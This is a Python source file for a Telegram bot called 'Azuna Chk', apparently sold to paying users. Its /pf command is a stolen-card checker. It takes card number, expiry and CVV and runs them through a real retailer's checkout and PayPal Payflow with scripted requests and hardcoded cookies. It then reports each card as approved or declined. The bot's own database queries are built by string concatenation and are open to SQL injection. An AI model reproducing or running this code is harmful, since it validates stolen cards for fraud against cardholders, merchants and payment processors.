import json
import requests
import time
import asyncio
import re
import colored 
from asyncio import sleep
import os
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 
import names
import aiohttp
import codecs
import base64
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from db import *
import random
from bs4 import BeautifulSoup
from user import*


import aiohttp
import certifi
import ssl
import random
import json
import asyncio
import platform
import names
import random_address
# Establece los detalles de la conexión


# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)

@Client.on_message(filters.command(["pf"], ["/", "."]))
async def ch(_, message: Message):

            username = message.from_user.username
            chat_id = message.chat.id
            user_id = (
        message.from_user.id
    )

            
# Obtener información del grupo
            queryGroups = "SELECT * FROM `groups` WHERE id=" + str(chat_id)
            cursorGroups = db.cursor()
            cursorGroups.execute(queryGroups)
            resultGroups = cursorGroups.fetchall()

# Obtener información del usuario
            queryUsers = "SELECT * FROM users WHERE user_id='" + str(user_id) + "'"
            cursorUsers = db.cursor()
            cursorUsers.execute(queryUsers)
            resultUsers = cursorUsers.fetchall()

            isPremium = False

# Verificar si el usuario es premium en la tabla "users" solo si no es premium en la tabla "groups"
            

            row = None  # Asignar un valor por defecto

            if not isPremium and len(resultUsers) > 0:
                row = resultUsers[0]
            if row and row[2] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True
            
            # ...
            
            if len(resultGroups) > 0:
                row = resultGroups[0]
            if row and row[3] == 'premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True

            

# Verificar si el bot se está utilizando en un grupo
            isGroupChat = message.chat.type == 'group'

            if not isPremium:
             message_text = "Para usar el bot"
    
             if isGroupChat:
              message_text += " en este grupo, debes comprar Azunachk. Por favor, ponte en contacto con los vendedores para obtener más información."
             else:
              message_text += ", debes comprar Azunachk. Por favor, ponte en contacto con los vendedores para obtener más información."
    
             await message.reply_text(f"<i>{message_text}</i>")
             return
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」 ━━━━
<i>♻️ Comando</i> <i>/pf</i>
<i>🔰 Formato:</i> <code>cc|mm|yy|cvv</code>
<i>➤ Gateway:</i> <code>payflow</code>
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」 ━━━━""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return  
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

# ...

# Al final del procesamiento de mensajes, marcar al usuario como no antispam


                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
            reply = await message.reply_text("<b>Cargando proceso...</b>")        
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            tiempo_inicio = time.perf_counter()
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>payflow</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]....■■□□□□□□□□ →20%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>payflow</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")


   
    #-----------------------------------------------------------------------------------------------
           
            ssl_context = ssl.create_default_context(cafile=certifi.where())
            conn = aiohttp.TCPConnector(ssl=ssl_context)
            async with aiohttp.ClientSession(connector=conn) as session:
                rand1 = random.randint(1000,9999)
                rand2 = random.randint(10000,99999)
        
                genaddr = random_address.real_random_address()
                address = genaddr['address1']
            
                City = genaddr['city']
    
                State = genaddr['state']
                Zip_Code = genaddr['postalCode']
                
                    
                
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                    # 'Accept-Encoding': 'gzip, deflate, br',
                    'Referer': 'https://www.keepsakebowling.com/',
                    'Connection': 'keep-alive',
                    # Requests sorts cookies= alphabetically
                    'Cookie': 'wp_customerGroup=NOT%20LOGGED%20IN; wz.uid=Y2ZWw963T1f8j11J295a163S7; _ga=GA1.1.1546320771.1656199114; wz.data=%7B%22lastPrtTS%22%3A1656201327887%2C%22sessions%22%3A%7B%2296NNIg6p15M329G1m53g711Zr%22%3A1%7D%7D; SREC_SESSION=V1.1656199121694; private_content_version=21b5352834faf2ceb21b895aa1cf0558; mage-banners-cache-storage=%7B%7D; PHPSESSID=8354d82vv7pe4dkdg90au8gfna; _ga_FRZLFQS7JN=GS1.1.1656773135.1.1.1656773175.0; form_key=dFZ3zYEEF4HGRore; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; mage-messages=; form_key=dFZ3zYEEF4HGRore; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; section_data_ids=%7B%22cart%22%3A1656773170%2C%22directory-data%22%3A1656773170%2C%22gtm%22%3A1656773170%7D',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                })
                async with session.get('https://www.keepsakebowling.com/checkout/cart/') as resp:
                    try :          
                        soup_response = await resp.text()
                        soup = BeautifulSoup(soup_response , 'lxml')
                        form_key = soup.find("input", {"name": "form_key"})["value"]
                        cartid = 'dUGJCXevkHlGXCDPSNLry41EuesYIXoe'
                    except UnboundLocalError or TypeError:
                        await session.close()
                        return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                
                data = {
                    "cartId":"dUGJCXevkHlGXCDPSNLry41EuesYIXoe",
                    "paymentMethod":{
                        "method":"payflowpro",
                        "additional_data":{
                            "cc_type":"MC",
                            "cc_exp_year": ano,
                            "cc_exp_month": mes,
                            "cc_last_4": cc[-4:]
                        }
                    },
                    "email":f"JoanBaldezTruco{random.randint(1000,9999)}@gmail.com",
                    "billingAddress":{
                        "countryId":"US",
                        "regionId":"55",
                        "regionCode":"FL",
                        "region":"Florida",
                        "street":[
                            "1920 street"
                        ],
                        "company":"",
                        "telephone":"7859097876",
                        "postcode":"33130",
                        "city":"Miami",
                        "firstname":"Joan",
                        "lastname":"Baldez",
                        "saveInAddressBook":None
                    }
                }   
                async with session.post(f'https://www.keepsakebowling.com/rest/default/V1/guest-carts/{cartid}/set-payment-information', json=data) as resp:
                    try :
                        response = await resp.text()
                    except UnboundLocalError:
                        await session.close()
                        return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
                    except TypeError:
                        await session.close()
                        return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
    
                data = [
                    ('form_key', form_key),
                    ('captcha_form_id', 'payment_processing_request'),
                    ('payment[method]', 'payflowpro'),
                    ('billing-address-same-as-shipping', 'on'),
                    ('captcha_form_id', 'co-payment-form'),
                    ('controller', 'checkout_flow'),
                    ('cc_type', 'MC'),
                ]
                async with session.post('https://www.keepsakebowling.com/paypal/transparent/requestSecureToken/', data=data) as resp:
                    try :          
                        rep = await resp.json()
                        securetoken   = rep['payflowpro']['fields']['securetoken']
                        securetokenid = rep['payflowpro']['fields']['securetokenid']
                    except UnboundLocalError:
                        await session.close()
                        return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                    except TypeError:
                        await session.close()
                        return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
                data = {
                    'result': '0',
                    'securetoken': securetoken,
                    'securetokenid': securetokenid,
                    'respmsg': 'Approved',
                    'result_code': '0',
                    'csc': cvv,
                    'expdate': f"{mes}{ano[2:4]}",
                    'acct': cc,
                }
                async with session.post('https://payflowlink.paypal.com/',data=data) as resp:
                    try :          
                        response = await resp.text()
                        soup = BeautifulSoup(response , 'lxml')
                    except UnboundLocalError:
                        await session.close()
                        return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'            
                    except TypeError:
                        await session.close()
                        return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'  
    
                if int(response.find('name="PROCCVV2"')) > 0 :
                    if (int(response.find('Verified')) > 0) or (int(response.find('CVV2 Mismatch')) > 0) or (int(response.find('Insufficient funds available')) > 0):
                        AVSDATA = soup.find("input", {"name": "AVSDATA"})["value"]
                        PROCCVV2 = soup.find("input", {"name": "PROCCVV2"})["value"]
                        RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                        await session.close()
                        errormessage= "Approved"
                    else :
                        AVSDATA = soup.find("input", {"name": "AVSDATA"})["value"]
                        PROCCVV2 = soup.find("input", {"name": "PROCCVV2"})["value"]
                        RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                        await session.close()
                        errormessage= "Declined", RESPMSG, AVSDATA, PROCCVV2
                elif (int(response.find('Verified')) > 0) or (int(response.find('CVV2 Mismatch')) > 0) or (int(response.find('Insufficient funds available')) > 0):
                    RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                    await session.close()
                    errormessage= "ApprovedSinCVV", RESPMSG
                elif (int(response.find('name="RESPMSG"')) > 0):
                    RESPMSG = soup.find("input", {"name": "RESPMSG"})["value"]
                    await session.close()
                    errormessage= "DeclinedSinCVV", RESPMSG
                else :
                    await session.close()
                    print(response)
                    errormessage= "An unexpected error occurred in response. It was not generated correctly. ⚠️"
           
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>payflow</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            keyboard = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("📿 Canal", url="https://t.me/AzunaChkLinks"),
               
            ]
        ]
    )
               
            if errormessage=="Approved":
                await reply.edit_text(f"""   
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅|CVV[{PROCCVV2}]|AVS[{AVSDATA}]</b> 
<i>Message ➤</i><code> {RESPMSG}</code>
<i>Gateway ➤</i> payflow
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard)
            elif(errormessage=="Your card's security code is incorrect. incorrect_cvc"):
                await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved CCN! ✅</b> 
<i>Message ➤</i><code> {errormessage}</code>
<i>Gateway ➤</i> payflow
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard)
            elif RESPMSG=="Declined by Fraud Service":
             await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Declined! ❌|CVV[M]|AVS[XXN]</b> 
<i>Message ➤</i><code> {RESPMSG}</code>
<i>Gateway ➤</i> payflow
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard) 
            

            else:
                await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Declined! ❌|CVV[{PROCCVV2}]|AVS[{AVSDATA}]</b> 
<i>Message ➤</i><code> {RESPMSG}</code>
<i>Gateway ➤</i> payflow
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""",
            reply_markup=keyboard) 
            
